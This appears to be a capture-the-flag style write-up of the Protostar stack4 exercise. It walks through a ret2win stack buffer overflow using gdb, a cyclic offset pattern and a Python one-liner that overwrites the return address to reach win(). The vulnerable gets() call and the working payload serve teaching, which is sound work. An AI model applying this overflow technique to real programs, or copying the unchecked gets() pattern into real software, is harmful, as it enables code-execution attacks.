source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

This one is **ret2win**,

```
user@protostar:~$ objdump -d stack4 | grep win
080483f4 <win>:
```

Set a break point before `ret` of function `main`, (`ret` is equal to `pop eip`, means pop stack top into `eip`)

```
(gdb) disas main
Dump of assembler code for function main:
0x08048408 <main+0>:	push   %ebp
0x08048409 <main+1>:	mov    %esp,%ebp
0x0804840b <main+3>:	and    $0xfffffff0,%esp
0x0804840e <main+6>:	sub    $0x50,%esp
0x08048411 <main+9>:	lea    0x10(%esp),%eax
0x08048415 <main+13>:	mov    %eax,(%esp)
0x08048418 <main+16>:	call   0x804830c <gets@plt>
0x0804841d <main+21>:	leave  
0x0804841e <main+22>:	ret    
End of assembler dump.
(gdb) b *main+22
```

Now the stack frame layout is

```
+----------+
|          | <- ebp (restored already)
+----------+
|   ...    | 
| ret addr | <- esp
+----------+
|  ...     |
|          | <- buffer
+----------+
```

The offset between `buffer` and `esp` can be calculated using pattern generator and calculator, and is 76.

```
(gdb) r
Starting program: /home/user/stack4 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Breakpoint 1, 0x0804841e in main (argc=Cannot access memory at address 0x41346349
) at stack4/stack4.c:16

(gdb) x $esp
0xbffff67c:	0x63413563
```

```
user@protostar:~$ python -c "print b'a'*76 + b'\xf4\x83\x04\x08'" | ./stack4
code flow successfully changed
Segmentation fault
```
